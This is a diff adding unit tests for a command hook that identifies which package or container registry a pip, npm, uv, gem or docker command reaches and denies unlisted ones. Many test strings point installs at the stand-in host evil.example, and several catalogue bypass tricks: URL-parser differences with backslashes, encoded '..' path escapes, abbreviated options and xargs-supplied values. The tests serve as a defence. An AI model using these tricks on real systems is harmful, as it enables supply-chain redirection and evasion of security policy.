@@ -156,9 +156,157 @@ class RegistryTargetTests(unittest.TestCase):
             with self.subTest(command=command):
                 self.assertEqual(targets(command), [(UNKNOWN, None)])
 
-    def test_a_variable_in_the_path_ends_the_path(self):
+    def test_a_variable_in_a_url_path_leaves_the_host_and_ends_an_image_path(self):
+        # $T may hold `../..`, which reaches any path on the host: only a value with no path covers it. An image path
+        # cannot hold `..`, so there the path ends before the variable.
+        self.assertEqual(targets("pip install -i https://pypi.example.org/team/$T/simple x"), [(REGISTRY, "pypi.example.org")])
         self.assertEqual(targets("docker push ghcr.io/$ORG/app"), [(REGISTRY, "ghcr.io")])
-        self.assertEqual(targets("pip install -i https://pypi.example.org/team/$T/simple x"), [(REGISTRY, "pypi.example.org/team")])
+        self.assertEqual(targets("docker push ghcr.io/acme/$APP:1"), [(REGISTRY, "ghcr.io/acme")])
+
+    def test_a_backslash_or_a_stray_character_in_the_authority_is_unknown(self):
+        # Node's URL parser (npm, uv) and urllib3 (pip, twine, poetry) end the authority at a backslash, so the first
+        # command connects to evil.example; Python's urllib.parse does not. Neither host is read: unknown.
+        for command in ("npm install --registry 'https://evil.example\\@registry.npmjs.org/' x",
+                        "npm install --registry 'https://registry.npmjs.org\\@evil.example/' x",
+                        "pip install -i 'https://evil.example\\@pypi.org/simple' x",
+                        "npm install --registry 'evil.example\\@registry.npmjs.org' x",
+                        "npm install --registry 'https://reg istry.npmjs.org/' x",
+                        "npm install --registry 'https://registry.npmjs.org\"@evil.example/' x",
+                        "npm install --registry 'https://registry.npmjs.org^@evil.example/' x",
+                        # A WHATWG parser reads a host from these too.
+                        "npm install --registry https:evil.example x", "npm install --registry 'https:/\\evil.example' x",
+                        "npm install --registry 'https:\\\\evil.example' x", "npm install --registry https:///evil.example x",
+                        # A last label a WHATWG parser reads as a number: an IPv4 address.
+                        "npm install --registry https://1.2.3.0x4/ x", "npm install --registry https://evil.0x7f/ x"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(UNKNOWN, None)])
+        # Credentials, variables in them included, are still skipped.
+        self.assertEqual(targets("npm install --registry 'https://u:p%40ss@npm.example.org/' x"), [(REGISTRY, "npm.example.org")])
+
+    def test_an_escaped_or_unreadable_path_segment_leaves_only_the_host(self):
+        # npm normalized /api/npm/npm-approved/%2e%2e/npm-remote-all/ to /api/npm/npm-remote-all/.
+        for segment in ("%2e%2e", ".%2e", "%2E%2E", "%2e.", "..\\npm-remote-all", "..;", "$UP", "${UP}", "`echo ..`"):
+            command = "npm install --registry 'https://artifactory.example.com/api/npm/npm-approved/%s/npm-remote-all/' x" % segment
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(REGISTRY, "artifactory.example.com")])
+        # A literal .. is applied, as the parsers apply it.
+        self.assertEqual(targets("npm install --registry https://artifactory.example.com/api/npm/npm-approved/../npm-remote-all/ x"),
+                         [(REGISTRY, "artifactory.example.com/api/npm/npm-remote-all")])
+
+    def test_abbreviated_long_options_and_short_clusters(self):
+        url = "https://evil.example/simple"
+        for command in (
+                # pip (optparse) takes any unique prefix of a long option, and i or f at the end of a cluster of flags.
+                "pip install --index %s x", "pip install --in %s x", "pip install --ind=%s x", "pip install --extra %s x",
+                "pip wheel --ext=%s x", "pip install --find %s x", "pip download --f %s x", "pip install -vi %s x",
+                "pip install -Ui %s x", "pip install -qi %s x", "pip install -qvU -i %s x", "pip lock -i %s",
+                # Python's own options: -mMODULE, and -m clustered with other flags.
+                "python -mpip install -i %s x", "python -Im pip install -i %s x", "python3 -W ignore -m pip install -i %s x",
+                "python3 -X importtime -Bm pip install -i %s x", "py -3.12 -m pip install -i %s x",
+                "python3 -m pip.__main__ install -i %s x",
+                # A general pip option this module does not know, before the subcommand.
+                "pip --cache-d /tmp install -i %s x",
+                # npm (nopt): an abbreviation of --registry down to --reg, and the -reg shorthand.
+                "npm --reg=%s install x", "npm install --regis %s x", "npm install -reg %s x", "pnpm add x --reg %s",
+                "npm c set registry %s", "npm conf set registry=%s",
+                # twine (argparse), gem (Ruby's OptionParser).
+                "twine upload --repository-u %s dist/*", "gem install x --so %s", "gem push x.gem --ho=%s",
+                "gem sources --ad %s", "gem install x -Vs %s"):
+            command = command % url
+            with self.subTest(command=command):
+                self.assertEqual(len(targets(command)), 1)
+                self.assertEqual(targets(command)[0][0], REGISTRY)
+                self.assertTrue(targets(command)[0][1].startswith("evil.example"))
+        self.assertEqual(targets("pip install -qihttps://evil.example/simple x"), [(REGISTRY, "evil.example/simple")])
+        self.assertEqual(targets("npm --reg https://ok.example config set registry https://evil.example"),
+                         [(REGISTRY, "ok.example"), (REGISTRY, "evil.example")])
+        # Not these: another option's value in the cluster, uv's exact names (`--extra` is uv's extras option),
+        # twine's --repository NAME, a script's own options, and an option that only shares a prefix.
+        for command in ("pip install -Ur req.txt x", "pip install -ri x", "uv sync --extra dev", "uv add x --extra cli",
+                        "twine upload --repository internal dist/*", "python3 script.py -i https://evil.example/simple",
+                        "python -c 'import pip' -i https://evil.example/simple", "npm install --regex x",
+                        "pip install --editable . --exists-action w"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [])
+
+    def test_more_uv_commands_and_container_runs(self):
+        url = "https://evil.example/simple"
+        for command in ("uvx --index %s ruff", "uvx --index-url %s ruff@0.6", "uvx -i %s ruff", "uv tool install --index %s ruff",
+                        "uv tool run --index %s ruff", "uv tool upgrade --default-index %s ruff",
+                        "uv run --index %s --with x script.py", "uv run --extra-index-url=%s pytest", "uv venv --index-url %s",
+                        "uv export --index-url %s", "uv build --find-links %s", "uv remove x --index %s",
+                        "uv pip list --outdated --index-url %s", "uv publish --publish-url %s", "uv publish --check-url=%s",
+                        "UV_PUBLISH_URL=%s uv publish", "UV_PUBLISH_CHECK_URL=%s uv publish",
+                        "UV_DEFAULT_INDEX=internal=%s uv lock"):
+            command = command % url
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(REGISTRY, "evil.example/simple")])
+        # docker and podman run and create pull a missing image.
+        for command in ("docker run ghcr.io/evil/app", "docker run --rm -it -e A=b -v /x:/y --name n ghcr.io/evil/app sh",
+                        "docker run -dp 8080:80 ghcr.io/evil/app", "docker create --platform linux/amd64 ghcr.io/evil/app:1",
+                        "docker container run -d ghcr.io/evil/app", "docker container create ghcr.io/evil/app",
+                        "podman run --pull=always ghcr.io/evil/app", "podman create --authfile a.json ghcr.io/evil/app",
+                        "docker --context remote run -- ghcr.io/evil/app"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(REGISTRY, "ghcr.io/evil/app")])
+        # An option this module does not know: both readings, the flag one naming the image.
+        self.assertIn((REGISTRY, "ghcr.io/evil/app"), targets("podman run --new-flag ghcr.io/evil/app"))
+        self.assertIn((REGISTRY, "ghcr.io/evil/app"), targets("podman run --new-option value ghcr.io/evil/app"))
+        # Each (position, readings left) is walked once: thousands of unknown options stay linear, not cubic.
+        self.assertEqual(targets("podman run " + "--zz " * 5000 + "ghcr.io/evil/app"), [(REGISTRY, "ghcr.io/evil/app")])
+        for command in ("uv publish --index internal", "uv publish", "uv python install -i pydir 3.12", "uv init --name x",
+                        "docker run --rm alpine echo ghcr.io/x/y", "docker run ubuntu", "docker run --help",
+                        "docker container ls", "podman run --rootfs /srv/root sh"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [])
+
+    def test_runners_are_looked_through_past_their_own_options(self):
+        url = "https://evil.example/simple"
+        for command in ("uv run --no-project pip install -i %s x", "uv run -- pip install -i %s x",
+                        "uv --directory d run pip install -i %s x", "uv run --with requests pip install -i %s x",
+                        "uv run -p 3.12 python -m pip install -i %s x", "uv run --new-flag pip install -i %s x",
+                        "poetry -C dir run pip install -i %s x", "poetry run -- pip install -i %s x",
+                        "pipenv run python -m pip install -i %s x", "uvx --from 'pip==24' pip install -i %s x",
+                        "bundle exec pip install -i %s x"):
+            command = command % url
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(REGISTRY, "evil.example/simple")])
+        self.assertEqual(targets("uv run --index https://a.example.org/simple pip install -i https://b.example.org/simple x"),
+                         [(REGISTRY, "a.example.org/simple"), (REGISTRY, "b.example.org/simple")])
+
+    def test_pip_config_keys_in_any_case_and_with_underscores(self):
+        for key in ("global.index_url", "global.INDEX-URL", "install.Index_Url", "global.extra_index_url", "global.extra-index_url"):
+            with self.subTest(key=key):
+                self.assertEqual(targets("pip config set %s https://evil.example/simple" % key), [(REGISTRY, "evil.example/simple")])
+        self.assertEqual(targets("pip config set install.find_links https://evil.example/w"), [(REGISTRY, "evil.example/w")])
+        self.assertEqual(targets("pip config set install.find_links ./wheels"), [])
+
+    def test_a_value_option_left_last_is_unknown(self):
+        # xargs or stdin supplies the value, which the hook cannot read.
+        for command in ("echo https://evil.example | xargs npm install --registry", "echo u | xargs npm install x --reg",
+                        "echo u | xargs pip install -i", "echo u | xargs pip install x --index-url",
+                        "echo u | xargs uv pip install x --index", "echo u | xargs uvx --index",
+                        "echo u | xargs twine upload dist/* --repository-url", "echo u | xargs gem install x --source",
+                        "echo u | xargs npm config set registry", "echo u | xargs pip config set global.index-url",
+                        "echo u | xargs poetry source add internal", "echo u | xargs uv publish --publish-url",
+                        "echo ghcr.io/x/y | xargs docker push", "echo ghcr.io/x/y | xargs docker pull",
+                        "echo ghcr.io/x/y | xargs docker run"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(UNKNOWN, None)])
+        self.assertEqual(targets("poetry source add pypi"), [])  # PyPI needs no URL
+
+    def test_a_heredoc_line_that_reads_as_an_assignment_counts(self):
+        # The docs say so: such a line is read as an assignment, so writing it into a file this way fires the rule.
+        self.assertEqual(targets("cat > .env <<'EOF'\nPIP_INDEX_URL=https://evil.example/simple\nEOF"),
+                         [(REGISTRY, "evil.example/simple")])
+        self.assertEqual(targets("echo 'PIP_INDEX_URL=https://evil.example/simple' > .env"), [])
+
+    def test_no_deprecation_warning(self):
+        # re.split's maxsplit passed by position warns on Python 3.13+.
+        import warnings
+        with warnings.catch_warnings():
+            warnings.simplefilter("error", DeprecationWarning)
+            self.assertEqual(targets("pip install -i https://pypi.example.org/simple?x#y x"), [(REGISTRY, "pypi.example.org/simple")])
 
     def test_commands_that_name_no_registry(self):
         for command in ("npm install", "npm ci", "npm publish", "pnpm add left-pad", "yarn", "npx create-react-app x",
@@ -256,6 +404,29 @@ class HookDecisionTests(unittest.TestCase):
 
     def test_every_registry_must_be_covered(self):
         self.assertEqual(self.effect("pip install -i https://pypi.example.org/simple --extra-index-url https://pypi.org/simple x"), "deny")
+
+    def test_parser_differences_and_path_escapes_fire(self):
+        # Review of PR #135: each of these reached a registry the rule does not list.
+        values = ("registry.npmjs.org", "artifactory.example.com/api/npm/npm-approved", "pypi.example.org/simple")
+        for command in ("npm install --registry 'https://evil.example\\@registry.npmjs.org/' left-pad",
+                        "npm install --registry https://artifactory.example.com/api/npm/npm-approved/%2e%2e/npm-remote-all/ x",
+                        "npm install --registry 'https://artifactory.example.com/api/npm/npm-approved/..\\npm-remote-all/' x",
+                        "npm install --registry 'https://artifactory.example.com/api/npm/npm-approved/$UP/npm-remote-all/' x",
+                        "pip install --ind https://pypi.org/simple x", "pip install -Ui https://pypi.org/simple x",
+                        "python -mpip install -i https://pypi.org/simple x", "npm --reg=https://evil.example/ install x",
+                        "uvx --index https://pypi.org/simple ruff", "uv run --no-project pip install -i https://pypi.org/simple x",
+                        "docker run ghcr.io/evil/app", "pip config set global.index_url https://pypi.org/simple",
+                        "echo https://evil.example | xargs npm install --registry"):
+            with self.subTest(command=command):
+                self.assertEqual(self.effect(command, values=values), "deny")
+        for command in ("npm install --registry https://registry.npmjs.org/ left-pad",
+                        "npm install --registry https://artifactory.example.com/api/npm/npm-approved/sub/ x",
+                        "pip install --ind https://pypi.example.org/simple x"):
+            with self.subTest(command=command):
+                self.assertEqual(self.effect(command, values=values), "none")
+        # Only a value with no path covers a URL path it cannot read.
+        self.assertEqual(self.effect("npm install --registry https://artifactory.example.com/api/npm/npm-approved/%2e%2e/x/ y",
+                                     values=("artifactory.example.com",)), "none")
 
     def test_modes_hosts_and_expiry(self):
         self.assertEqual(self.effect("npm publish --registry https://registry.npmjs.org", mode="monitor"), "none")
